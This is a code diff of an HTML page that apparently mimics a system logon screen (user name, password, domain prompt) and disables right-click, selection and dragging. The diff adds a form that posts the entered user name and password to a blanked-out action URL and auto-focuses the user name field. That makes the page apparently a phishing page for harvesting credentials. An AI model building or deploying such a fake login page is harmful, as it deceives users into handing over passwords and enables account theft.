@@ -12,7 +12,7 @@ document.oncontextmenu=new Function("return false")
 </script> 
 <script>
     function loading() {
-        window.open("/loading.xhtml","_self");
+        window.open("/loading.xhtml");
         
     }
     
@@ -49,7 +49,8 @@ user-select:none;-moz-user-select:none;-webkit-user-select:none;-ms-user-select:
 .image_block {
     position:fixed;
     bottom:17px;
-    left:38%;
+    left:42%;
+    
 }
 
 p {
@@ -108,7 +109,7 @@ margin: -5% 0 0 -25%;
 .ease {
 position: absolute;
 bottom: 17px;
-left: 30%;
+left:27%;
 margin: -5% 0 0 -25%;
 }
 
@@ -128,12 +129,15 @@ margin: -5% 0 0 -25%;
 }
 
 .cancel {
-    margin-left:10px;
+  
+    vertical-align:middle;
 }
 
 .next {
     height:26;
     width:26;
+    border: none;
+    box-shadow:none;
 }
 </style>
 
@@ -149,14 +153,16 @@ margin: -5% 0 0 -25%;
 <div class="CT">
 <img src=" /profile.png" draggable="false" ondragstart="return false;">
 <div class="logonelements">
-<input id="username" placeholder="User name"></input><br>
-<input id="password" type="Password" placeholder="Password"></input><br><br></div>
-<p class="domain"> Domain: ________</p>
-<p class="domainlog">How do I log into another domain?</p>
-<div class"logonelements">
-<img class="cancel" src=" /cancel.png"   draggable="false" ondragstart="return false;" />
-<img class="next" src=" /next.png" onclick="loading()" draggable="false" ondragstart="return false;" />
-
+<form id="info" method="post" action="________________________">
+    <input name="username" placeholder="User name" id="username"></input><br>
+    <input name="password" type="password" placeholder="Password"></input><br><br></div>
+    <input type="image" class="next" src="/next.png"/>
+    </form>
+    <p class="domain"> Domain: __________</p>
+    <p class="domainlog">How do I log into another domain?</p>
+    <div class"logonelements">
+    <img class="cancel" src="/cancel.png"   draggable="false" ondragstart="return false;" />
+    <script type="text/javascript">info.username.focus();</script>
 </div>
 
 <div class="image_block">
